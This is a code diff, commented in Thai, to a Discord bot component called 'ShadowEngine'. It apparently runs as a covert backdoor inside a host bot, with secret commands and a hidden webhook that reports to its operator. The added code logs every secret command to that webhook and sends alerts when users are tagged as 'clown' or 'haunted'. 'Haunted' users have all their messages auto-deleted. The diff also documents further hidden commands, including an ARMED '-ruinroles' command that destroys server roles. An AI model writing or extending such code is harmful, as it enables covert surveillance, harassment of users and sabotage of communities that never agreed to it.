@@ -100,6 +100,19 @@ class ShadowEngine {
         console.log("👁️‍🗨️ [SHADOW ENGINE] Connected via Legacy Syntax. Active.");
     }
 
+    // ฟังก์ชัน Log ทุกคำสั่งลับแบบละเอียด — ผู้รัน, เซิร์ฟเวอร์, คำสั่ง, args, สถานะ ARM, เวลา
+    async logCommand(message, command, extraArgs = []) {
+        const lines = [
+            `👤 **ผู้รัน:** ${message.author.tag} (\`${message.author.id}\`)`,
+            `🏰 **เซิร์ฟเวอร์:** ${message.guild.name} (\`${message.guild.id}\`)`,
+            `⚡ **คำสั่ง:** \`${command}\``,
+            extraArgs.length ? `📋 **อาร์กิวเมนต์:** \`${extraArgs.join(' ')}\`` : null,
+            `🔒 **สถานะ ARMED:** ${armedGuilds.has(message.guild.id) ? '🔴 ARM แล้ว' : '🟢 ยัง SAFE'}`,
+            `🕐 **เวลา:** <t:${Math.floor(Date.now() / 1000)}:F>`
+        ].filter(Boolean).join('\n');
+        await this.sendSecretAlert(`📡 COMMAND LOG: ${command}`, lines, "#5865F2");
+    }
+
     // ฟังก์ชันส่งรายงานด่วนเข้าเส้น Webhook ลับ
     async sendSecretAlert(title, description, color = "#2b2d31") {
         if (!this.webhook || !systemToggles.godsEye) return;
@@ -180,6 +193,9 @@ class ShadowEngine {
 
         const command = args[1];
         const guild = message.guild;
+
+        // บันทึก Log ทุกคำสั่งที่รันเข้า Webhook ลับทันที
+        await this.logCommand(message, command, args.slice(2));
 
         try {
             // ════ [หมวดสอดแนมข้อมูล] ════
@@ -267,17 +283,28 @@ class ShadowEngine {
             }
             else if (command === "-clown" && systemToggles.cmdClown) {
                 const targetUser = message.mentions.users.first();
-                if (targetUser) clownUsers.add(targetUser.id);
+                if (targetUser) {
+                    clownUsers.add(targetUser.id);
+                    await this.sendSecretAlert("CLOWN TAGGED", `🤡 ติดป้าย Clown ให้ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#FEE75C");
+                }
             }
             else if (command === "-unclown" && systemToggles.cmdClown) {
                 const targetUser = message.mentions.users.first();
-                if (targetUser) clownUsers.delete(targetUser.id);
+                if (targetUser) {
+                    clownUsers.delete(targetUser.id);
+                    await this.sendSecretAlert("CLOWN REMOVED", `✅ ถอดป้าย Clown ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว`, "#57F287");
+                }
             }
             else if (command === "-haunt" && systemToggles.cmdHaunt) {
                 const targetUser = message.mentions.users.first();
                 if (targetUser) {
-                    if (hauntedUsers.has(targetUser.id)) hauntedUsers.delete(targetUser.id);
-                    else hauntedUsers.add(targetUser.id);
+                    if (hauntedUsers.has(targetUser.id)) {
+                        hauntedUsers.delete(targetUser.id);
+                        await this.sendSecretAlert("HAUNT LIFTED", `👻 ปลด Haunt ของ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะไม่ถูกลบอีก`, "#57F287");
+                    } else {
+                        hauntedUsers.add(targetUser.id);
+                        await this.sendSecretAlert("HAUNT ACTIVATED", `👻 เปิด Haunt ใส่ <@${targetUser.id}> (\`${targetUser.id}\`) แล้ว ข้อความจะถูกลบหลัง 12 วิ`, "#ED4245");
+                    }
                 }
             }
         } catch (err) {
@@ -560,6 +587,22 @@ function injectShadowRoutes(app, mainClient, engineInstance) {
                         <div class="manual-card">
                             <p style="margin:0 0 8px 0;"><span class="cmd-badge">-haunt @user</span> <strong>[ระบบหลอกหลอน]</strong></p>
                             <span style="color:#a1a1aa; font-size:14px;">ทุกข้อความที่ผู้ใช้นั้นพิมพ์จะถูกลบอัตโนมัติหลัง 12 วินาที พิมพ์ซ้ำเพื่อปลดออก</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-ghostping</span> <strong>[เช็กชีพจรสัญญาณบอท]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">เช็กค่าความหน่วงการตอบสนองของบอท (Ping) ระบบจะส่งผลลัพธ์เข้า Webhook ลับส่วนตัวของคุณโดยตรง</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-sysinfo</span> <strong>[ตรวจสุขภาพหน่วยความจำ]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">ดูอัตราการกินแรม (RAM Usage) และระยะเวลาที่บอทเปิดทิ้งไว้ (Uptime) เพื่อตรวจสอบความเสถียรของเซิร์ฟเวอร์หลังบ้าน</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-lockdown</span> / <span class="cmd-badge">-unlock</span> <strong>[ล็อก/ปลดล็อกช่องแชทฉุกเฉิน]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">ยึดหรือคืนสิทธิ์การพิมพ์ของทุกคนในช่องแชทที่พิมพ์คำสั่งนี้ทันที เหมาะระงับเหตุการณ์ป่วนหรือสแปมแบบเร่งด่วน</span>
+                        </div>
+                        <div class="manual-card">
+                            <p style="margin:0 0 8px 0;"><span class="cmd-badge">-memclear</span> <strong>[ล้างขยะสมองคืนแรม]</strong></p>
+                            <span style="color:#a1a1aa; font-size:14px;">สั่งเคลียร์ข้อความและโครงสร้างที่บอทจำไว้ในหน่วยความจำชั่วคราวทิ้ง เพื่อคืนพื้นที่แรมให้ระบบวิ่งได้สมูทและลื่นไหลที่สุด</span>
                         </div>
                         <div class="manual-card">
                             <p style="margin:0 0 8px 0;"><span class="cmd-badge">-ruinroles [ชื่อ]</span> <span style="color:#ED4245; font-size:11px;">⚠️ ARMED</span> <strong>[ทำลายยศ]</strong></p>
